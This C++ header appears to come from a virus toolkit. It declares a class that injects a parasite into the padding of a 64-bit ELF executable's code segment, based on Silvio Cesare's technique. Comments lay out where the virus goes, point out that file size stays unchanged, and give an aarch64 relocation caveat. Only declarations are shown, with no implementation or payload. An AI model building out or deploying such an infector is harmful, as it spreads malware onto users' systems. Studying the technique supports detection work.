#pragma once
#include <elf.h>
#include <span>

namespace vt::infector {
// This algorithm injects a parasite into an 64 bit elf's code segment padding,
// based on the paper publish by Silvio Cesare:
// https://vxug.fakedoma.in/archive/VxHeaven/lib/vsc01.html
//
//  host elf file structure       infected elf file structure
//  -------------------           -----------------------
//  elf_hdr                       elf_hdr
//  phdrs                         phdrs
//  executable_sections           executable_sections
//  padding                       padding             <- virus inserted here
//  non-exec sections             non-exec sections
//  shdrs                         shdrs
//
//
// Because the sections in file has the same padding, inserting virus doesn't
// change file size.
//
//  infected elf segments
//  -------------------
//  LOAD RX
//    Ehdr                      --
//    phdrs                      |     executable segment
//    interp                     |
//    PADDING    <- virus here  --
//  LOAD RW
//    .data                     --
//    ...                        |     ajacent non-executable segment
//    ...                       --

// Warning: because the insertion point is always not going to be page aligned
// (padding insertion), for arm's adrp insruction will break if the parasite
// refers to rodata.
// For example:
//    adrp	x0, 0x0
//    add x0, x0, #0x544 (compiler generated page offset.)
// If the code is inserted at a place that is not a multiple of 4k, the
// generated offset would be wrong.
// Make sure the parasite doesnt merge text with rodata for aarch64 if this
// infection method is used. This is not a problem for x86-64 because the
// lea offset(%rip),%rdi can be relocated safely even to places that are not
// page aligned.
class PaddingInfect {
 public:
  size_t injected_host_size() { return host_size_; }

  bool analyze(std::span<const std::byte> host_mapping,
               std::span<const std::byte> parasite_mapping);

  bool inject(std::span<std::byte> host_mapping,
              std::span<const std::byte> parasite_mapping);

 private:
  size_t host_size_{};

  // the code cave size that is available for insertion.
  size_t padding_size_{};

  // the last byte offset of code setment in file.
  Elf64_Off code_segment_last_byte_offset_{};

  // the offset in file that the first byte of parasite code starts.
  Elf64_Off parasite_file_offset_{};

  // the fixed virtual memory address the parasite code is loaded to. Only
  // valid for EXEC elfs.
  Elf64_Addr parasite_load_address_{};

  // the program header entry corresponding to the code segment that will be
  // patched.
  size_t patch_phdr_entry_idx_{};

  // the parasite size with extra alignment padding accounted for.
  size_t parasite_size_and_padding_{};
};

}  // namespace vt::infector